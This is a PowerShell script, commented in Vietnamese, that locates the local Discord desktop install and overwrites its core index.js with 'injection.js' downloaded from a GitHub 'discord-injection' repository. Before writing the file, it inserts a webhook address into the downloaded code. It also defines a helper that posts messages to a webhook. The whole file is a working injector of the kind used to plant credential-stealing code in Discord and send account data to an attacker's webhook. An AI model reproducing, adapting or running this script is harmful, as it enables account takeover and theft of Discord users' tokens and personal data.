# URL của tệp cần tải

function loghook {
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Message
    )

    # Define the webhook URL
    $webhookUrl = "YOUR_WEBHOOK_HERE2"

    # Create the payload
    $payload = @{
        content = $Message
    } | ConvertTo-Json

    # Send the POST request to the webhook
    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
        Write-Output "Message sent successfully."
    }
    catch {
        Write-Error "Failed to send message: $_"
    }
}

# Example usage



$url = "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/injection.js"

# Đường dẫn cục bộ của Discord
$localAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
$discordPath = Join-Path $localAppData "Discord"

# Lấy đường dẫn phiên bản mới nhất của ứng dụng Discord
$appVersionPath = Get-ChildItem -Path $discordPath -Directory | Sort-Object -Property Name -Descending | Select-Object -First 1
if (-not $appVersionPath) {
    Write-Host "Không tìm thấy phiên bản Discord trong $discordPath"
    exit
}

# Lấy đường dẫn của discord_desktop_core
$corePath = Join-Path $appVersionPath.FullName "modules\discord_desktop_core-*\discord_desktop_core"
$coreVersionPath = Get-ChildItem -Path $corePath -Directory | Sort-Object -Property Name -Descending | Select-Object -First 1
if (-not $coreVersionPath) {
    Write-Host "Không tìm thấy thư mục discord_desktop_core trong $appVersionPath"
    exit
}

# Đường dẫn đến tệp index.js
$indexPath = Join-Path $coreVersionPath.FullName "index.js"
if (-not (Test-Path $indexPath)) {
    Write-Host "Không tìm thấy tệp index.js trong $coreVersionPath"
    exit
}

# Tải nội dung từ URL
try {
    $content = Invoke-WebRequest -Uri $url -UseBasicParsing
    $fileContent = $content.Content
} catch {
    Write-Host "Không thể tải nội dung từ $url"
    exit
}

# Thay thế %key% thành 123 trong nội dung
$newContent = $fileContent -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2'

# Ghi nội dung mới vào tệp index.js
try {
    Set-Content -Path $indexPath -Value $newContent -Force
    Write-Host "Đã cập nhật tệp index.js thành công."
} catch {
    Write-Host "Không thể ghi nội dung vào tệp index.js"
    exit
}
